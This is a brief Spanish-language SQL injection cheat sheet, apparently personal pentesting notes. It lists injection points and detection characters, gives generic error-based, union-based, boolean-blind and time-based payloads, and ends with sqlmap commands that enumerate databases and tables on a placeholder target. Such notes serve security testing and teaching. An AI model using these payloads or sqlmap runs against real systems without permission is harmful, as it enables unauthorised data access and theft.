## SQL Injection (SQLi)

### Qué es

Manipulación de consultas SQL mediante input no validado para leer, modificar o borrar datos.

### Dónde buscar

* Parámetros GET/POST
* JSON (APIs)
* Headers (User-Agent, Referer)
* Cookies

### Detección manual rápida

```sql
' " ) -- #
```

Indicadores: errores SQL, cambios en respuesta, delays.

### Error-based

```sql
' OR 1=1--
```

### Union-based (flujo real)

```sql
' ORDER BY 1--
' ORDER BY 2--
```

```sql
' UNION SELECT null,version()--
```

### Blind Boolean

```sql
' AND 1=1--
' AND 1=2--
```

### Blind Time-based

```sql
' AND SLEEP(5)--
```

### sqlmap (uso correcto)

```bash
sqlmap -u "http://target/item?id=1" --dbs --batch
sqlmap -u "http://target/item?id=1" -D appdb --tables
```



